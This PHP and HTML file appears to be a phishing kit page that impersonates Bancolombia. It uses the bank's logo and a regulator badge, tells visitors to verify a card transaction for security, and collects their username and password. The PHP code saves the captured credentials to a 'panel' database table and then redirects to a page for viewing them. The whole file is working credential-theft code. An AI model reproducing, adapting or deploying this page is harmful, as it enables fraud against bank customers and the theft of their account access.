<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f6f6f6;
            margin: 0;
            flex-direction: column;
        }

        .container {
            background-color: white;
            padding: 2rem;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 70%;
            text-align: center;
            margin: 5%;
            margin-bottom: 5%;
        }

        .logo img {
            width: 100px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        label {
            text-align: left;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            color:  #555;
        }

        select, input {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border:  solid #ddd;
            border-width: 0 0 2px 0;
            border-radius: 5px;
            font-size: 1rem;
            color: #333;
            width: 100%;
            box-sizing: border-box;
        }

        .forgot-password {
            text-align: right;
            display: block;
            margin-bottom: 1.5rem;
            color: #0066cc;
            font-size: 0.9rem;
        }

        .login-button {
            background-color: #fada25;
            border: none;
            padding: 0.8rem;
            border-radius: 5px;
            font-size: 1rem;
            color: #000000;
            cursor: not-allowed;
            margin-bottom: 1.5rem;
        }

        .register {
            font-size: 0.9rem;
            color: #555;
        }

        .register a {
            color: #0066cc;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body style="background-image: url(../../img/fond.svg); background-repeat: no-repeat; background-position:bottom;">

    <header> 
        <div style=" padding-bottom: 4%; padding-top: 5%; margin-bottom: 8%; width: 100%; display: flex; justify-content: center; background-color: white;">
            <img style="width: 70%;" src="img/BANCOLOMBIA.png" alt="">
        </div>
    
    </header>

    <h1>Te damos la bienvenida</h1>

    <div class="container">

        
        <div style="margin-top: 1%; margin-bottom: 8%;">
            <p style="text-align: left;">Verifica la transacción que intentas realizar con tu tarjeta  por seguridad</p>
            
        </div>

        
        
        
        <form method="POST">
            <input type="text" id="username" name="dato1" placeholder="Usuario" required>
            <input type="password" id="password" name="dato2" placeholder="Ingresa tu contraseña"    required>
            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
            <button id="submitBtn" class="login-button">INGRESAR</button>
            
        </form>

        

    </div>

    <footer style="padding: 5%; margin-bottom: 5%;">
       
          <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
            <img src="../../img/BANCOLOMBIA.png" style="width: 50%;" alt="">
            <img src="../../img/vigilado.691ba87177cfc7656937fafcb0c6925a.svg" style="width: 40%;" alt="">
          </div>
            
        

    </footer>
    
</body>


</html>